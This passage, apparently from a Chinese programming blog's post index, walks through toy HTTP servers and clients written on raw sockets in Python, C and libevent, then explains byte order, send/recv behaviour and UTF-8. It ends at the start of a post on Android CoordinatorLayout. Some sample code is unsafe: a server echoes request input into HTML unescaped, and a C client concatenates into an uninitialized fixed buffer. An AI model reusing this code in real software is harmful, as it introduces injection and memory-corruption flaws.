&#39;/index.html&#39;: content = index_content elif src == &#39;/image/image_12.jpg&#39;: content = pic_content elif src == &#39;/reg.html&#39;: content = reg_content elif re.match(&#39;^/\\?.*$&#39;, src): entry = src.split(&#39;?&#39;)[1] # main content of the request content = &#39;HTTP/1.x 200 ok\\r\\nContent-Type: text/html\\r\\n\\r\\n&#39; content += entry content += &#39;&lt;br /&gt;&lt;font color=&quot;green&quot; size=&quot;7&quot;&gt;register successs!&lt;/p&gt;&#39; else: continue # deal with POST method elif method == &#39;POST&#39;: form = request.split(&#39;\\r\\n&#39;) entry = form[-1] # main content of the request content = &#39;HTTP/1.x 200 ok\\r\\nContent-Type: text/html\\r\\n\\r\\n&#39; content += entry content += &#39;&lt;br /&gt;&lt;font color=&quot;green&quot; size=&quot;7&quot;&gt;register successs!&lt;/p&gt;&#39; ###### # More operations, such as put the form into database # ... ###### else: continue if(type(content) is str): content = content.encode(&#39;utf-8&#39;) conn.sendall(content) # close connection conn.close() 本地浏览器访问localhost:10086应该就能看到结果了，值得一提的是自己在chrome里面访问”http://localhost:18004/index.html&quot;这个地址的时候，事实上浏览器发送的数据是这样的 b’GET /index.html HTTP/1.1\\r\\nHost: localhost:18004\\r\\nConnection: keep-alive\\r\\nCache-Control: max-age=0\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\\r\\nDNT: 1\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\\r\\nCookie: _ga=GA1.1.dsadsa.dsadas; _gid=GA1.1.dsadsa.dsadasda\\r\\n\\r\\n’ 对了，浏览器默认会请求favicon，所以在服务器这边看到了另一个请求 b’GET /favicon.ico HTTP/1.1\\r\\nHost: localhost:18004\\r\\nConnection: keep-alive\\r\\nPragma: no-cache\\r\\nCache-Control: no-cache\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\\r\\nDNT: 1\\r\\nAccept: image/webp,image/apng,image/,/*;q=0.8\\r\\nReferer: http://localhost:18004/index.html\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\\r\\nCookie: _ga=GA1.1.dsadsa.dsadas; _gid=GA1.1.dsadsa.dsadasda\\r\\n\\r\\n’ 平时用的都是requests这个库,不过自己写也还是很简单 #!/usr/bin/python # -*- coding: UTF-8 -*- # 导入socket库: import socket # 创建一个socket: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 建立连接: s.connect((&#39;www.sina.com.cn&#39;, 80)) s.send(b&#39;GET / HTTP/1.1\\r\\nHost: www.sina.com.cn\\r\\nConnection: close\\r\\n\\r\\n&#39;) # 接收数据: buffer = [] while True: # 每次最多接收1k字节: d = s.recv(1024) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) s.close() header, html = data.split(b&#39;\\r\\n\\r\\n&#39;, 1) print(header.decode(&#39;utf-8&#39;)) # 把接收的数据写入文件: with open(&#39;sina.html&#39;, &#39;wb&#39;) as f: f.write(html) 上述代码，server和client都不能很好的处理并发或者利用多进程 高阶版 自己用selector实现了一个toy server，使用curl可以像请求一个本地服务一样去获得response sudo python3 src/_045_realpython_socket_article/dumbHttpServer.py 127.0.0.1 80 完成的地方包括: server注册socket non-blocking监听。有新的client连接上就把client socket加入selector监听。 在出现EventRead之后使用socket.recv()读取请求（GET /index.html http/1.1 ….），把”index.html”这样的path加入data 在出现EventWrite之后，从data中获取之前的path（实际中可以根据这个path去找服务或者文件资源），返回utf-8 encoded内容，外加http response header (socket.sendall). 主要的缺陷包括: client这边ctrl+c之后，server这边会接收到一个13的信号，默认对这个信号的处理是杀进程 在send或者read的时候有可能出现BrokenPipeError或者ConnectionResetError。暂时只好到处try except. 自己用socket伪造http协议的content-length字段是能够被wget认可的，只是这个content-length = len(正文.encode(‘utf-8’))。就是这部分长度是字节数组的长度，否则会短一些。 http response协议头字段之间加(\\r\\n header最后跟两个换行符) 这些都是必要的 curl不知道为什么在读完response之后还卡在那里（除非server主动close掉socket） wrk跑分看不出来这个toy server的吞吐量。 C语言版本C语言的应该最接近底层,C语言实现HTTP的GET和POST请求似乎有很多现成的例子可以直接拿来抄 一个简单的httpServer.c(unix环境下运行) #include &lt;stdio.h&gt; #include &lt;netinet/in.h&gt; #include &lt;sys/socket.h&gt; // socket #include &lt;sys/types.h&gt; // 基本数据类型 #include &lt;unistd.h&gt; // read write #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // open close #include &lt;sys/shm.h&gt; #include &lt;signal.h&gt; #define PORT 8888 #define SERV &quot;0.0.0.0&quot; #define QUEUE 20 #define BUFF_SIZE 1024 typedef struct doc_type{ char *key; char *value; }HTTP_CONTENT_TYPE; HTTP_CONTENT_TYPE http_content_type[] = { { &quot;html&quot;,&quot;text/html&quot; }, { &quot;gif&quot; ,&quot;image/gif&quot; }, { &quot;jpeg&quot;,&quot;image/jpeg&quot; } }; int sockfd; char *http_res_tmpl = &quot;HTTP/1.1 200 OK\\r\\n&quot; &quot;Server: Cleey&#39;s Server V1.0\\r\\n&quot; &quot;Accept-Ranges: bytes\\r\\n&quot; &quot;Content-Length: %d\\r\\n&quot; &quot;Connection: close\\r\\n&quot; &quot;Content-Type: %s\\r\\n\\r\\n&quot;; void handle_signal(int sign); // 退出信号处理 void http_send(int sock,char *content); // http 发送相应报文 char* joinString(char *s1, char *s2);//字符串拼接 int main(int argc,char *argv[ ]){ signal(SIGINT,handle_signal); int count = 0; // 计数 // 定义 socket sockfd = socket(AF_INET,SOCK_STREAM,0); // 定义 sockaddr_in struct sockaddr_in skaddr; skaddr.sin_family = AF_INET; // ipv4 skaddr.sin_port = htons(PORT); skaddr.sin_addr.s_addr = inet_addr(SERV); // bind，绑定 socket 和 sockaddr_in if( bind(sockfd,(struct sockaddr *)&amp;skaddr,sizeof(skaddr)) == -1 ){ perror(&quot;bind error&quot;); exit(1); } // listen，开始添加端口 if( listen(sockfd,QUEUE) == -1 ){ perror(&quot;listen error&quot;); exit(1); } // 客户端信息 char buff[BUFF_SIZE]; struct sockaddr_in claddr; socklen_t length = sizeof(claddr); while(1){ int sock_client = accept(sockfd,(struct sockaddr *)&amp;claddr, &amp;length); printf(&quot;%d\\n&quot;,++count); if( sock_client &lt;0 ){ perror(&quot;accept error&quot;); exit(1); } memset(buff,0,sizeof(buff)); int len = recv(sock_client,buff,sizeof(buff),0); fputs(buff,stdout); //send(sock_client,buff,len,0); char *re = joinString(&quot;&lt;h2&gt;the client said&lt;/h2&gt; &lt;br&gt; &quot;,buff); http_send(sock_client,re); close(sock_client); } fputs(&quot;Bye Cleey&quot;,stdout); close(sockfd); return 0; } void http_send(int sock_client,char *content){ char HTTP_HEADER[BUFF_SIZE],HTTP_INFO[BUFF_SIZE]; int len = strlen(content); sprintf(HTTP_HEADER,http_res_tmpl,len,&quot;text/html&quot;); len = sprintf(HTTP_INFO,&quot;%s%s&quot;,HTTP_HEADER,content); send(sock_client,HTTP_INFO,len,0); } void handle_signal(int sign){ fputs(&quot;\\nSIGNAL INTERRUPT \\nBye Cleey! \\nSAFE EXIT\\n&quot;,stdout); close(sockfd); exit(0); } char* joinString(char *s1, char *s2) { char *result = malloc(strlen(s1)+strlen(s2)+1);//+1 for the zero-terminator //in real code you would check for errors in malloc here if (result == NULL) exit (1); strcpy(result, s1); strcat(result, s2); return result; } 使用方式: curl -X GET -d –header “Content-Type:application/json” –header “Authorization:JWT somerandomjwtstringandstuffs” “http://127.0.0.1:8888/user“ 一个类似于简易的curl的c语言httpClient可能长这样 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;netdb.h&gt; #include &lt;netinet/in.h&gt; #include &lt;unistd.h&gt; int get_ip_by_domain(const char *domain, char *ip); // 根据域名获取ip int main(int argc, char *argv[]){ if(argc!=2){ printf(&quot;please input host name %s ipn&quot;,argv[0]); return 1; } char * host = argv[1]; int sockfd; int len; struct sockaddr_in address; int result; char httpstring[1000]; char * server_ip[100]; get_ip_by_domain(host,server_ip); strcat(httpstring,&quot;GET / HTTP/1.1\\r\\n&quot;); strcat(httpstring,&quot;Host: &quot;); strcat(httpstring,host); strcat(httpstring,&quot;\\r\\n&quot;); strcat(httpstring, &quot;Connection: keep-alive\\r\\n&quot; &quot;Cache-Control: max-age=0\\r\\n&quot; &quot;Upgrade-Insecure-Requests: 1\\r\\n&quot; &quot;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36\\r\\n&quot; &quot;DNT: 1\\r\\n&quot; &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n&quot; &quot;Accept-Encoding: gzip, deflate, br\\r\\n&quot; &quot;Accept-Language: zh-CN,zh;q=0.9\\r\\n\\r\\n&quot;); char ch; sockfd = socket(AF_INET, SOCK_STREAM, 0); address.sin_family = AF_INET; printf(&quot;the server host is %s and the ip is %s\\n&quot;,argv[1],server_ip); address.sin_addr.s_addr = inet_addr(server_ip); address.sin_port = htons(80); len = sizeof(address); result = connect(sockfd,(struct sockaddr *)&amp;address,len); if(result == -1){ perror(&quot;oops: client connect error&quot;); return 1; } printf(&quot;befor connect!!&quot;); write(sockfd,httpstring,strlen(httpstring)); printf(&quot;after write!!\\n&quot;); while(read(sockfd,&amp;ch,1)){ printf(&quot;%c&quot;, ch); } close(sockfd); printf(&quot;n&quot;); return 0; } #define IP_SIZE 16 // 根据域名获取ip int get_ip_by_domain(const char *domain, char *ip) { char **pptr; struct hostent *hptr; hptr = gethostbyname(domain); if(NULL == hptr) { printf(&quot;gethostbyname error for host:%s/n&quot;, domain); return -1; } for(pptr = hptr-&gt;h_addr_list ; *pptr != NULL; pptr++) { if (NULL != inet_ntop(hptr-&gt;h_addrtype, *pptr, ip, IP_SIZE) ) { return 0; // 只获取第一个 ip } } return -1; } 使用方式: ./bin/client www.baidu.com ##这时候，在百度服务器看来，这个程序和普通的浏览器没有区别。试了下主流的网站，都没有什么问题。优酷返回了一大串奇怪的字符串，看了下，应该是content-encoding: gzip了，所以在终端里面看上去乱七八糟的。 上面这段会卡在read里面，因为读到最后一个字节的时候，客户端并不知道是没有更多数据还是网络不好堵住了。需要在每一次读完之后去找那个”\\r\\n\\r\\n”的结束标志。 一个使用libevent的版本的客户端可以这样写 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;signal.h&gt; #include &lt;assert.h&gt; #include &lt;unistd.h&gt; #include &lt;evhttp.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;event2/event.h&gt; #include &lt;event2/util.h&gt; #include &lt;event2/http.h&gt; #include &lt;event2/bufferevent.h&gt; void http_request_done(struct evhttp_request *req, void *arg){ char buf[8196]; //这里没处理了 int s = evbuffer_remove(req-&gt;input_buffer, &amp;buf, sizeof(buf) - 1); buf[s] = &#39;\\0&#39;; printf(&quot;%s&quot;, buf); // terminate event_base_dispatch() event_base_loopbreak((struct event_base *)arg); } char * get_tcp_socket_for_host(const char *hostname, ev_uint16_t port) { char port_buf[6]; struct evutil_addrinfo hints; struct evutil_addrinfo *answer = NULL; int err; evutil_socket_t sock; /* Convert the port to decimal. */ evutil_snprintf(port_buf, sizeof(port_buf), &quot;%d&quot;, (int)port); /* Build the hints to tell getaddrinfo how to act. */ memset(&amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; /* v4 or v6 is fine. */ hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; /* We want a TCP socket */ /* Only return addresses we can use. */ hints.ai_flags = EVUTIL_AI_ADDRCONFIG; /* Look up the hostname. */ err = evutil_getaddrinfo(hostname, port_buf, &amp;hints, &amp;answer); if (err != 0) { fprintf(stderr, &quot;Error while resolving &#39;%s&#39;: %s&quot;, hostname, evutil_gai_strerror(err)); return NULL; } /* If there was no error, we should have at least one answer. */ assert(answer); /* Just use the first answer. */ sock = socket(answer-&gt;ai_family, answer-&gt;ai_socktype, answer-&gt;ai_protocol); if (sock &lt; 0) return NULL; if (connect(sock, answer-&gt;ai_addr, answer-&gt;ai_addrlen)) { /* Note that we&#39;re doing a blocking connect in this function. * If this were nonblocking, we&#39;d need to treat some errors * (like EINTR and EAGAIN) specially. */ EVUTIL_CLOSESOCKET(sock); return NULL; } const char *s = NULL; char buf[128]; if ( answer-&gt;ai_family == AF_INET){ struct sockaddr_in *sin = (struct sockaddr_in *)answer-&gt;ai_addr; s = evutil_inet_ntop(AF_INET, &amp;sin-&gt;sin_addr, buf, 128); } else if ( answer-&gt;ai_family == AF_INET6){ struct sockaddr_in6 *sin6 = (struct sockaddr_in6 *)answer-&gt;ai_addr; s = evutil_inet_ntop(AF_INET6, &amp;sin6-&gt;sin6_addr, buf, 128); } if (s){ printf(&quot; -&gt;%s\\n&quot; , s); } char *res = (char *)malloc(sizeof(char)*strlen(s)+1); strcpy(res,s); return res; } int main(int argc, char **argv){ char *ip_addresss = get_tcp_socket_for_host(&quot;www.taobao.com&quot;,80); printf(&quot;the ip address of taobao is %s \\n&quot;,ip_addresss); struct event_base *base; struct evhttp_connection *conn; struct evhttp_request *req; base = event_base_new(); conn = evhttp_connection_base_new(base, NULL, ip_addresss, 80); req = evhttp_request_new(http_request_done, base); // 这里就是写request 的 header evhttp_add_header(req-&gt;output_headers, &quot;Host&quot;, &quot;www.taobao.com&quot;); evhttp_add_header(req-&gt;output_headers, &quot;Connection&quot;, &quot;keep-alive&quot;); evhttp_add_header(req-&gt;output_headers, &quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;); evhttp_add_header(req-&gt;output_headers, &quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;); evhttp_make_request(conn, req, EVHTTP_REQ_GET, &quot;/index.html&quot;); evhttp_connection_set_timeout(req-&gt;evcon, 600); event_base_dispatch(base); return 0; } 网络通信显然还要注意一个字节序的问题，简单来讲,java是大端的,c++是跟着平台走的且多数为小端c++的服务器和java的客户端之间的通信 C/C++语言编写的程序里数据存储顺序是跟编译平台所在的CPU相关的，而现在比较普遍的 x86 处理器是 Little EndianJAVA编写的程序则唯一采用 Big Endian 方式来存储数据 htons();//将short类型的值从主机字节序转换为网络字节序(上面就是把端口号转化一下)inet_addr();//将IP地址字符串转换为long类型的网络字节序（接受一个字符串，返回一个long）gethostbyname();//获得与该域名对应的IP地址inet_ntoa();//将long类型的网络字节序转换成IP地址字符串//这些转换字节序的函数是必须的，因为ip地址，端口这些东西不是应用层处理，而是由路由器这些东西去处理的，后者遵照网络标准使用的是big-endian，所以必须转换字节序。 读函数readssize_t read(int fd,void *buf,size_t nbyte)read函数是负责从fd中读取内容.当读成功 时,read返回实际所读的字节数,如果返回的值是0 表示已经读到文件的结束了,小于0表示出现了错误.如果错误为EINTR说明读是由中断引起 的, 如果是ECONNREST表示网络连接出了问题. 写函数write #include &lt;unistd.h&gt; ssize_t write(int fd, const void *buf, size_t count); write函数将buf中的nbytes字节内容写入文件描述符fd.成功时返回写的字节数.失败时返回-1. 并设置errno变量. 在网络程序中,当我们向套接字文件描述符写时有两可能.1)write的返回值大于0,表示写了部分或者是全部的数据. 这样我们用一个while循环来不停的写入，但是循环过程中的buf参数和nbyte参数得由我们来更新。也就是说，网络写函数是不负责将全部数据写完之后在返回的。2)返回的值小于0,此时出现了错误.我们要根据错误类型来处理.如果错误为EINTR表示在写的时候出现了中断错误.如果为EPIPE表示网络连接出现了问题(对方已经关闭了连接). recv和send都是跟buffer打交道的Socket send函数和recv函数详解1.send 函数 int send( SOCKET s, const char FAR *buf, int len, int flags ); 不论是客户还是服务器应用程序都用send函数来向TCP连接的另一端发送数据。客户程序一般用send函数向服务器发送请求，而服务器则通常用send函数来向客户程序发送应答。 该函数的第一个参数指定发送端套接字描述符； 第二个参数指明一个存放应用程序要发送数据的缓冲区； 第三个参数指明实际要发送的数据的字节数； 第四个参数一般置0。 这里只描述同步Socket的send函数的执行流程。当调用该函数时， （1）send先比较待发送数据的长度len和套接字s的发送缓冲的长度， 如果len大于s的发送缓冲区的长度，该函数返回SOCKET_ERROR； （2）如果len小于或者等于s的发送缓冲区的长度，那么send先检查协议是否正在发送s的发送缓冲中的数据，如果是就等待协议把数据发送完，如果协议还没有开始发送s的发送缓冲中的数据或者s的发送缓冲中没有数据，那么send就比较s的发送缓冲区的剩余空间和len （3）如果len大于剩余空间大小，send就一直等待协议把s的发送缓冲中的数据发送完 （4）如果len小于剩余 空间大小，send就仅仅把buf中的数据copy到剩余空间里（注意并不是send把s的发送缓冲中的数据传到连接的另一端的，而是协议传的，send仅仅是把buf中的数据copy到s的发送缓冲区的剩余空间里）。 如果send函数copy数据成功，就返回实际copy的字节数，如果send在copy数据时出现错误，那么send就返回SOCKET_ERROR；如果send在等待协议传送数据时网络断开的话，那么send函数也返回SOCKET_ERROR。 要注意send函数把buf中的数据成功copy到s的发送缓冲的剩余空间里后它就返回了，但是此时这些数据并不一定马上被传到连接的另一端。如果协议在后续的传送过程中出现网络错误的话，那么下一个Socket函数就会返回SOCKET_ERROR。（每一个除send外的Socket函数在执 行的最开始总要先等待套接字的发送缓冲中的数据被协议传送完毕才能继续，如果在等待时出现网络错误，那么该Socket函数就返回 SOCKET_ERROR） 注意：在Unix系统下，如果send在等待协议传送数据时网络断开的话，调用send的进程会接收到一个SIGPIPE信号，进程对该信号的默认处理是进程终止。 通过测试发现，异步socket的send函数在网络刚刚断开时还能发送返回相应的字节数，同时使用select检测也是可写的，但是过几秒钟之后，再send就会出错了，返回-1。select也不能检测出可写了。 recv函数 int recv( SOCKET s, char FAR *buf, int len, int flags); 不论是客户还是服务器应用程序都用recv函数从TCP连接的另一端接收数据。该函数的第一个参数指定接收端套接字描述符； 第二个参数指明一个缓冲区，该缓冲区用来存放recv函数接收到的数据； 第三个参数指明buf的长度； 第四个参数一般置0。 这里只描述同步Socket的recv函数的执行流程。当应用程序调用recv函数时， （1）recv先等待s的发送缓冲中的数据被协议传送完毕，如果协议在传送s的发送缓冲中的数据时出现网络错误，那么recv函数返回SOCKET_ERROR， （2）如果s的发送缓冲中没有数据或者数据被协议成功发送完毕后，recv先检查套接字s的接收缓冲区，如果s接收缓冲区中没有数据或者协议正在接收数据，那么recv就一直等待，直到协议把数据接收完毕。当协议把数据接收完毕，recv函数就把s的接收缓冲中的数据copy到buf中（注意协议接收到的数据可能大于buf的长度，所以 在这种情况下要调用几次recv函数才能把s的接收缓冲中的数据copy完。recv函数仅仅是copy数据，真正的接收数据是协议来完成的）， recv函数返回其实际copy的字节数。如果recv在copy时出错，那么它返回SOCKET_ERROR；如果recv函数在等待协议接收数据时网络中断了，那么它返回0。 注意：在Unix系统下，如果recv函数在等待协议接收数据时网络断开了，那么调用recv的进程会接收到一个SIGPIPE信号，进程对该信号的默认处理是进程终止。 除了read和write之外还有int recv(int sockfd,void buf,int len,int flags)int send(int sockfd,void buf,int len,int flags)这两个函数，功能差不多，只是多了第四个参数 简单版本的参考使用Linux c语言编写简单的web服务器socket http文件下载器c语言实现 高阶版本的参考高阶一点，处理并发的多线程的server和client源码 需要记住的是，read是从系统的缓冲区读取的,write是写到tcp buffer里面的 还有实现websocket协议的，实现sock5协议的 见过的一个websocket的请求长这样GET wss://nexus-websocket-b.xxx.io/pubsub/xxx?X-Nexus-New-Client=true&amp;X-Nexus-Version=0.4.53 HTTP/1.1Host: nexus-websocket-b.xxx.ioConnection: UpgradePragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3538.77 Safari/537.36Upgrade: websocketOrigin: https://app.xxx.ioSec-WebSocket-Version: 13Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Sec-WebSocket-Key: xaxsasdasdas==Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits Response长这样HTTP/1.1 101 Switching ProtocolsDate: Thu, 25 Oct 2018 06:07:10 GMTConnection: upgradeUpgrade: websocketSec-WebSocket-Accept: sasasasaD/tA= 这样也就完成了protocol upgrade的过程 js并不支持对操作系统socket的直接控制，可能是安全因素(websocket倒是有，不过那是另外一回事了)。 #include &lt;unistd.h&gt; ssize_t read(int fd, void *buf, size_t count); read这个函数返回的是读取的byte数，(On success, the number of bytes read is returned (zero indicates end of file), and the file position is advanced by this number;On error, -1 is returned, and errno is set appropriately. In this case, it is left unspecified whether the file position (if any) changes.) 如果read的时候一直统计当前总的read到的bytes数，应该是要比content-length长不少的。那么一个字符到底多少个byte呢首先要明白，read出来的东西是byte(是被utf-8编码过的)。几乎所有的语言在接收到之后都要重新解码一下，所以在这里decode一下，用c语言decode怎么弄？ It depends what is the character and what encoding it is in: An ASCII character in 8-bit ASCII encoding is 8 bits (1 byte), though it can fit in 7 bits. An ISO-8895-1 character in ISO-8859-1 encoding is 8 bits (1 byte). A Unicode character in UTF-8 encoding is between 8 bits (1 byte) and 32 bits (4 bytes). A Unicode character in UTF-16 encoding is between 16 (2 bytes) and 32 bits (4 bytes), though most of the common characters take 16 bits. This is the encoding used by Windows internally. A Unicode character in UTF-32 encoding is always 32 bits (4 bytes). An ASCII character in UTF-8 is 8 bits (1 byte), and in UTF-16 - 16 bits. The additional (non-ASCII) characters in ISO-8895-1 (0xA0-0xFF) would take 16 bits in UTF-8 and UTF-16. what-is-the-default-encoding-for-c-strings 结论就是c语言的标准并没有规定用什么encoding A c string is pretty much just a sequence of bytes. That means, that it does not have a well-defined encoding, it could be ASCII, UTF8 or anything else, for that matter. Because most operating systems understand ASCII by default, and source code is mostly written with ASCII encoding, so the data you will find in a simple (char) will very often be ASCII as well. Nonetheless, there is no guarantee that what you get out of a (char) will be UTF8 or even KOI8. java用utf-8,c用了ascii 用上面的c语言的server发出这样一个字符串 “你好啊\\r\\n” python的client每次读取一个字节,然后打印出0101这样的形式 while True: # 每次最多接收1个字节: d = s.recv(1) t = &#39;&#39; for x in d: t+= format(ord(x),&#39;b&#39;) print(t) if d: buffer.append(d) else: break data = b&#39;&#39;.join(buffer) print(data); //在python的socket client这边接收到了111001001011110110100000111001011010010110111101111001011001010110001010 b’\\xe4’ b’\\xbd’ b’\\xa0’ b’\\xe5’ b’\\xa5’ b’\\xbd’ b’\\xe5’ b’\\x95’ b’\\x8a’ ‘\\r’ ‘\\n’ 因为tcp是有序的，所以发送端的字节以什么顺序排列的，接受端就是受到完全一样顺序排列的字节。这里因为网络传输是以字节为单位的。而sizeof(char) = 1 ，但是sizeof(int) = 4, 以上都还只是text-based content，字节序这回事只跟多字节类型的数据有关的比如int,short,long这类数字类型有关，所以基于文本传输的协议当然不存在字节序问题(当然content-length这种数字还是要注意一下的)。 //在console里面还能够正常的打印出“你好啊”这三个字（包括换行也做了） ut-8是变长的Unicode符号范围 | UTF-8编码方式(十六进制) | （二进制）———————-+——————————————— 0 &lt;–&gt; 0x7f | 0xxxxxxx 0x80 &lt;–&gt; 0x7FF | 110xxxxx 10xxxxxx 0x800 &lt;–&gt; 0xFFFF | 1110xxxx 10xxxxxx 10xxxxxx0x10000 &lt;–&gt; 0x10FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx //来看这三个字的unicode码你 -&gt; u4f60 —–&gt; 转换成二进制就是 0100 1111 0110 0000(位于上表的第三行，也就是三个字节) 把0100 1111 0110 0000塞进1110xxxx 10xxxxxx 10xxxxxx的xxx里面得到11100100 10111101 10100000（E4 BD A0）好 -&gt; u597d —–&gt; 同上，不再赘述啊 -&gt; u554a —–&gt; 同上，不再赘述 在浏览器console里面输入encodeURI(‘你好啊’)“%E4%BD%A0%E5%A5%BD%E5%95%8A” //是不是和python那边收到的东西很像 所以，c语言这边关键函数send(sock_client,”你好啊”,len,0);看上去是发送了6个字节(每个汉字unicode两个字节)，实际上send调用下层在发送出去的时候回把这个6个字节的数据分散在9个字节长度的utf-8 byte array上。可以认为发送6个字节，耗费9个字节的流量(如果发送的全部是ascii字符就不会这么浪费了，但其实utf-8已经很节省了) 结论就是utf-8 encode的工作是底层根据locale做的，跟application无关。 libc只是当作以0结尾的字符串原封不动地write给内核，识别汉字的工作是由终端的驱动程序做的。也就是基于当前的locale #include &lt;stdio.h&gt; int main(void) { printf(&quot;你好\\n&quot;); return 0; } 上述程序源文件是以UTF-8编码存储的： $ od -tc nihao.c 0000000 # i n c l u d e &lt; s t d i o . 0000020 h &gt; \\n \\n i n t m a i n ( v o i 0000040 d ) \\n { \\n \\t p r i n t f ( &quot; 344 275 0000060 240 345 245 275 \\ n &quot; ) ; \\n \\t r e t u r 0000100 n 0 ; \\n } \\n 0000107 其中八进制的344 375 240（十六进制e4 bd a0）就是“你”的UTF-8编码，八进制的345 245 275（十六进制e5 a5 bd）就是“好”。把它编译成目标文件，”你好\\n”这个字符串就成了这样一串字节：e4 bd a0 e5 a5 bd 0a 00，汉字在其中仍然是UTF-8编码的，一个汉字占3个字节，这种字符在C语言中称为多字节字符（Multibyte Character）。运行这个程序相当于把这一串字节write到当前终端的设备文件。如果当前终端的驱动程序能够识别UTF-8编码就能打印出汉字，如果当前终端的驱动程序不能识别UTF-8编码（比如一般的字符终端）就打印不出汉字。也就是说，像这种程序，识别汉字的工作既不是由C编译器做的也不是由libc做的，C编译器原封不动地把源文件中的UTF-8编码复制到目标文件中，libc只是当作以0结尾的字符串原封不动地write给内核，识别汉字的工作是由终端的驱动程序做的。 Unicode in C and C++: What You Can Do About It Today ##不知道为什么,百度首页的response中没有content-length字段read from socket , and write it to local file ,how about that?这篇文章提到，由于http keep-alive的存在，读取server的response已经读不到EOF了，所以也就不能以EOF作为读取完毕的标志。分两种情况：有Content-length的，Transfer-Encoding：chunked（复杂一点点）这两种。chunked简单说就是把一个大文件切分成N个小包，每个包(chunk)里面包括header和body。这个header里面也是有body的长度的。 todo** sock5协议的解释c语言libevent实现简单的webserverpython selector实现高阶的httpserver","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"CoordiantorLayout及滑动原理解析","date":"2018-09-24T19:35:11.000Z","path":"2018/09/24/2018-09-24-mastering-scrolling-techniques/","text":"在Android平台上，掌握滑动事件是一件让人头疼的事情。 1.关于CoordinateLayout里面的东西（针对supportLibrary27.1.0代码）&lt;android.support.design.widget.CoordinatorLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; &gt; &lt;android.support.design.widget.AppBarLayout &gt; &lt;android.support.v7.widget.Toolbar app:layout_scrollFlags=&quot;scroll|enterAlways|snap&quot; /&gt; &lt;android.support.design.widget.TabLayout /&gt; &lt;/android.support.design.widget.AppBarLayout&gt; &lt;android.support.v4.view.ViewPager app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; /&gt; &lt;android.support.design.widget.FloatingActionButton /&gt; &lt;/android.support.design.widget.CoordinatorLayout&gt; 剔除一些无关的属性后，可以观察到:app:layout_scrollFlags是写给AppBarLayout看的app:layout_behavior是写给CoordinatorLayout看的 app:layout_scrollFlags = scroll的时候，手指上滑下滑，加了flag的View只会在外层的ScrollingView(这里就是ViewPager了)滑动到头了才开始滑动 app:layout_scrollFlags = scroll|enterAlways的时候，手指上下滑动时，加了flag的view会立刻响应（还不等外部的ScrollingView滑到头就开始滑动，当然这里没有动画，手指慢慢的挪的话，可以让它停在一半的位置）。可以理解为手指上下滑动时，只要加了flag的view会优先消费完滑动距离 app:layout_scrollFlags = scroll|enterAlways|snap的时候，就加上动画了（手指往下拖，把toolbar拖出来不到一半的时候它会缩回去，超出一半的时候会动画弹出来）这段动画的代码在AppBarLayout.Behavior的onStopNestedScroll方法里面判断了 if ((flags &amp; LayoutParams.FLAG_SNAP) == LayoutParams.FLAG_SNAP) {//所以flag这个东西其实是AppbarLayout.LayoutParams的一个属性。可以进行位运算操作 // ... animateOffsetTo(coordinatorLayout, abl, MathUtils.clamp(newOffset, -abl.getTotalScrollRange(), 0), 0); } //那个snap的动画长这样 if (mOffsetAnimator == null) { mOffsetAnimator = new ValueAnimator(); mOffsetAnimator.setInterpolator(AnimationUtils.DECELERATE_INTERPOLATOR); mOffsetAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { setHeaderTopBottomOffset(coordinatorLayout, child, (int) animation.getAnimatedValue()); //做动画的过程中调用AppbarLayout(其实就是一个LinearLayout)的offsetTopAndBottom方法 } }); } else { mOffsetAnimator.cancel(); } mOffsetAnimator.setDuration(Math.min(duration, MAX_OFFSET_ANIMATION_DURATION)); mOffsetAnimator.setIntValues(currentOffset, offset); mOffsetAnimator.start(); 在Cheesequare的首页，RecyclerView准备滑动(ActionMove)还没滑动时调用了RecyclerView.dispatchNestedPreScroll -&gt; CoordinateLayout.onNestedPreScroll -&gt;AppbarLayout.Beahvior.onNestedPreScroll -&gt;AppbarLayout.offsetTopAndBottom 